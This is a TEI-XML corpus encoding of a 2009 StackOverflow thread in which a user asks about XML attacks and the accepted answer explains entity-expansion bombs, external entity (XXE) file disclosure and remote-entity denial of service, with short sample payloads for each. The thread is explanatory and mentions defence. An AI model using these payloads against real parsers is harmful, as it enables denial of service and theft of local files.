@@ -1,0 +1,145 @@
+<?xml version="1.0"?>
+<TEI>
+	<teiHeader>
+		<fileDesc>
+			<titleStmt>
+				<title>xml vulnerabilities</title>
+				<author>Rohit</author>
+			</titleStmt>
+			<publicationStmt>
+				<p>Open Source</p>
+			</publicationStmt>
+			<sourceDesc>
+				<p> Pulled from StackOverflow: http://stackoverflow.com/questions/1906927/xml-vulnerabilities
+					On: Date Unknown 2015
+					Created by: 
+					Rachael Duke
+					Department of Linguistics
+					University of California, Davis
+					Please email me with any questions, comments, or errors.
+					Email: rebrim @ ucdavis . edu
+				</p>
+			<listPerson>
+				<person xml:id="Rohit">
+				<signatureContent>
+					<p>Reputation: <num>55</num></p>
+					<p> Page: http://stackoverflow.com/users/218431/rohit </p>
+					<p>Number of Gold Badges: <num></num></p>
+					<p>Number of Silver Badges:<num>1</num></p>
+					<p>Number of Bronze Badges:<num>5</num></p>	
+				</signatureContent>
+				</person>
+				<person xml:id="Emyr">
+				<signatureContent>
+					<p>Reputation: <num>1,532</num></p>
+					<p> Number of Gold Badges: <num></num></p>
+					<p>Number of Silver Badges:<num>6</num></p>
+					<p>Number of Bronze Badges:<num>24</num></p>
+				</signatureContent>
+				</person>
+				<person xml:id="ewernli">
+				<signatureContent>
+					<p>Reputation: <num>23.9k</num></p>
+					<p> Number of Gold Badges: <num>2</num></p>
+					<p>Number of Silver Badges:<num>40</num></p>
+					<p>Number of Bronze Badges:<num>83</num></p>
+				</signatureContent>
+				</person>
+				</listPerson>
+			</sourceDesc>
+		</fileDesc>
+	</teiHeader>
+	<text>
+		<body>
+		<front>
+			<div type="up vote">
+				<p>up vote  <num>6</num></p>
+			</div>
+			<div type="down vote">
+			<p>down vote
+          favorite</p>
+			</div>
+		</front>
+		<div type="forum">
+			<posting synch="Dec 15 '09 at 11:51" who="Rohit">
+			 <p> xml has been the backbone of the service oriented application(SOA) and it will be a useful one in the coming future. As xml is easy , flexible, it can be easily made vulnerable and the attackers can use it for their own purpose. As such some of the attacks by are coercive parsing attack, xml external entity(XEE) attack, xml dos(xdos) attack, xml bombs.
+			can any one tell in detail about these attacks.
+			how could one can simulate these attacks practically in a single system?	
+			<tag>xml</tag> <tag>security</tag>
+			</p>
+			</posting>	
+		</div>	
+		<div type="response">
+			<posting synch="Dec 15 '09 at 12:00" who="Emyr" IndentLevel="1">
+				<p>This reads like schoolwork.
+				</p>
+			</posting>
+		</div>
+		<front>
+			<head>1 Answer</head>
+				<div type="up vote">
+				<p>up vote  <num>12</num></p>
+				</div>
+				<div type="down vote">
+				<p>down vote
+          accepted</p>
+				</div>
+		</front>
+			<div type="answer">
+				<posting synch="Dec 15 '09 at 13:33" who="ewernli" revisedWhen="Dec 15 '09 at 13:40">
+			 	<p>First we need to distinguish the effect of attack from the feature that is exploited.
+
+				Particular features of XML that can be exploited are
+
+				XML entities
+				Proprietary extension of parser and validator
+				Cyclic/recursive references
+				Remote access
+				The effects can be either
+
+				DOS
+				Information disclosure
+				I don't think there is percise definition of a "bomb", but it refers to an attack that is particularly "compact" and which "expands". A "coercive parsing attack" exploits the nature of the XML model to overwhelm the parser.
+
+				The examples below are taken from XML Denial of Service Attacks and Defenses. Also, if you understand french, read the excellent magazine "La security des web services".
+
+				Example 1
+
+				A bomb using entities which result in a DOS because it exhausts the memory
+
+			&lt;?xml version="1.0"?>
+			&lt;!DOCTYPE kaboom [
+  			&lt;!ENTITY a "aaaaaaaaaaaaaaaaaa...">
+			]>
+			&lt;kaboom>&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;...&lt;/kaboom>
+			If you have 50'000 "aaaa...aaa" and 50'0000 &amp;a:&amp;a;...&amp;a;, a payload of 200KB expands to more than 2GB in memory
+
+			Example 2
+
+			An entity could be used to access another file in a unauthorized way. This leads to information disclosure.
+			&lt;?xml version="1.0"?>
+			&lt;!DOCTYPE letter [
+     		&lt;!ENTITY file SYSTEM "/sensitive.txt" >
+			]>
+			&lt;tag> &amp;file; &lt;/tag>
+			Example 3
+
+			Using the ability of certain parser to access remote resources (see http://www.ibm.com/developerworks/xml/library/x-tipgentity.html), now go figure what happens if the file bigfile.xml is 2GB. This probably leads to a DOS.
+
+			&lt;?xml version="1.0"?>
+			&lt;!DOCTYPE letter [
+     	&lt;!ENTITY file  SYSTEM "http://www.mysite.com/bigfile.xml" >
+			]>
+			&lt;tag> &amp;file; &lt;/tag>
+			Example 4
+
+			This recursion will lead to memory exhaust and probably a DOS.
+			&lt;!ENTITY companyname "Contoso Inc.">
+		&lt;!ENTITY divisionname "&amp;companyname; Web Products Division">
+			If this is schoolwork, then you should also think about how you can protect yourself from such attack.
+			</p>			
+				</posting>
+			</div>
+		</body>
+	</text>
+</TEI>
